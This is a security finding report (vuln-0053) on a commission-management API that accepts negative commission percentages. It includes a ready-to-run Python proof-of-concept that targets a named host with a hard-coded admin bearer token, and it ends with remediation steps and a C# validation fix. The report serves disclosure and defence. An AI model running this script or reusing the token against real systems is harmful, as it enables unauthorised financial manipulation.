# Business Logic Vulnerability: Negative Commission Percentages Accepted in Commission Plan Creation

**ID:** vuln-0053
**Severity:** HIGH
**Found:** 2026-02-26 20:54:14 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionPlan/CreateCommissionPlan
**Method:** POST
**CWE:** CWE-840
**CVSS:** 8.3

## Description

A business logic vulnerability was discovered in the commission plan creation functionality that allows negative commission percentages to be set. The `/api/CommissionPlan/CreateCommissionPlan` endpoint accepts negative values for the `commissionPercentage` parameter without proper validation.

This vulnerability enables the creation of commission plans that deduct money instead of paying commissions, potentially leading to financial losses for the organization. An attacker could create commission plans that reduce payouts or even result in negative balances for sales representatives.

## Impact

Successful exploitation of this vulnerability could result in:

1. **Financial Losses**: Commission plans with negative percentages could deduct money from payouts instead of paying commissions
2. **Financial Manipulation**: Malicious actors could create plans that reduce overall commission expenses
3. **Operational Disruption**: Incorrect commission calculations could lead to disputes and operational overhead
4. **Audit and Compliance Issues**: Invalid commission structures could violate financial regulations and audit requirements
5. **Reputation Damage**: Financial discrepancies could erode trust with sales representatives and partners

The business impact includes direct financial losses through manipulated commission calculations and increased operational costs for resolving disputes and correcting errors.

## Technical Analysis

The vulnerability exists in the `/api/CommissionPlan/CreateCommissionPlan` endpoint which lacks proper business logic validation for the `commissionPercentage` parameter. The system accepts any numeric value without validating that commission percentages should be within a reasonable range (typically 0-100%).

**Root Cause Analysis:**
1. Missing input validation for commission percentage values
2. Lack of business logic validation to ensure percentages are within expected ranges
3. Insufficient server-side validation of commission plan parameters
4. No approval workflow for commission plans with unusual parameters

**Technical Details:**
- Endpoint: `POST /api/CommissionPlan/CreateCommissionPlan`
- Vulnerable Parameter: `commissionPercentage`
- Accepted Values: Any numeric value including negative numbers
- Expected Behavior: Commission percentages should be validated to be between 0 and 100
- Actual Behavior: Negative values are accepted and processed

## Proof of Concept

To reproduce this vulnerability:

1. Authenticate as a user with commission plan creation privileges
2. Send a POST request to `/api/CommissionPlan/CreateCommissionPlan` with a negative commission percentage
3. Verify that the commission plan is created successfully with the negative percentage
4. Observe that the negative commission percentage affects commission calculations

**Proof-of-Concept Steps:**
1. Create a commission plan with negative commission percentage
2. Process commissions using the negative plan
3. Verify that payouts are reduced instead of increased
4. Confirm the negative impact on financial calculations

```
import requests
import json

# Target URL
BASE_URL = "https://commissionstest.callippus.in"
CREATE_PLAN_ENDPOINT = f"{BASE_URL}/api/CommissionPlan/CreateCommissionPlan"

# Authentication token (replace with valid token)
AUTH_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWRtaW4iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6InVzZXItMiIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvZ3JvdXBzaWQiOiJBZG1pbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3NwbiI6IjAiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJhZG1pbkBsb2NhbGhvc3QiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9wb3N0YWxjb2RlIjoiMCIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3N0YXRlb3Jwcm92aW5jZSI6IkNhbGxpcHB1cyIsImFjY2VzcyI6IltcIlJPTEVfQURNSU5cIl0iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJST0xFX0FETUlOIiwiZXhwIjoxNzcyMTYzNTYyLCJpc3MiOiJodHRwOi8vY2FsbGlwcHVzLmNvLnVrIiwiYXVkIjoiaHR0cDovL2NhbGxpcHB1cy5jby51ayJ9.7F-MGxeIutB6-pPAbhH-YFv89n5Ottof1nFMG3jeGtyw"

# Headers
headers = {
    "Authorization": f"Bearer {AUTH_TOKEN}",
    "Content-Type": "application/json"
}

# Negative commission plan payload
negative_plan_payload = {
    "planName": "Malicious Negative Plan",
    "description": "Commission plan with negative percentage to deduct money",
    "commissionPercentage": -15,  # Negative commission percentage
    "startDate": "2026-01-01",
    "endDate": "2026-12-31",
    "isActive": True,
    "organizationId": 1,
    "clientId": 1
}

def test_negative_commission_plan():
    """Test creation of commission plan with negative percentage"""
    print("Testing negative commission percentage vulnerability...")

    try:
        # Create commission plan with negative percentage
        response = requests.post(
            CREATE_PLAN_ENDPOINT,
            headers=headers,
            data=json.dumps(negative_plan_payload),
            timeout=10
        )

        # Check response
        if response.status_code == 200:
            print(f"✓ SUCCESS: Commission plan created with negative percentage (-15%)")
            print(f"Response: {response.text}")
            return True
        else:
            print(f"✗ FAILED: Status code {response.status_code}")
            print(f"Response: {response.text}")
            return False

    except requests.exceptions.RequestException as e:
        print(f"✗ ERROR: {str(e)}")
        return False

if __name__ == "__main__":
    success = test_negative_commission_plan()
    if success:
        print("\nVULNERABILITY CONFIRMED: Negative commission percentages are accepted")
        print("Impact: This could lead to financial losses through manipulated commission calculations")
    else:
        print("\nVulnerability not confirmed or error occurred during testing")
```

## Remediation

Implement comprehensive validation and business logic checks to prevent negative commission percentages:

1. **Input Validation**:
   - Add server-side validation to ensure `commissionPercentage` is a non-negative number
   - Implement range validation to ensure percentages are within reasonable bounds (0-100%)

2. **Business Logic Validation**:
   - Add business logic validation to ensure commission percentages make sense in context
   - Implement approval workflows for commission plans with unusual parameters
   - Add validation to prevent logically impossible commission structures

3. **Database Constraints**:
   - Add database-level constraints to prevent negative values in commission percentage fields
   - Implement triggers or stored procedures to validate commission plan data

4. **Monitoring and Alerting**:
   - Implement monitoring for commission plans with unusual parameters
   - Set up alerts for negative commission percentages or other suspicious configurations
   - Log and review all commission plan creation and modification events

5. **Financial Controls**:
   - Implement financial controls to detect and prevent incorrect commission calculations
   - Add reconciliation processes to identify discrepancies in commission payouts
   - Implement approval workflows for high-impact commission plan changes

6. **Code Fix Example**:
```csharp
// Add validation in the commission plan creation logic
public IActionResult CreateCommissionPlan(CommissionPlanDto planDto)
{
    // Validate commission percentage
    if (planDto.CommissionPercentage < 0 || planDto.CommissionPercentage > 100)
    {
        return BadRequest("Commission percentage must be between 0 and 100");
    }

    // Validate date range
    if (planDto.StartDate > planDto.EndDate)
    {
        return BadRequest("Start date must be before end date");
    }

    // Proceed with plan creation
    // ...
}
```

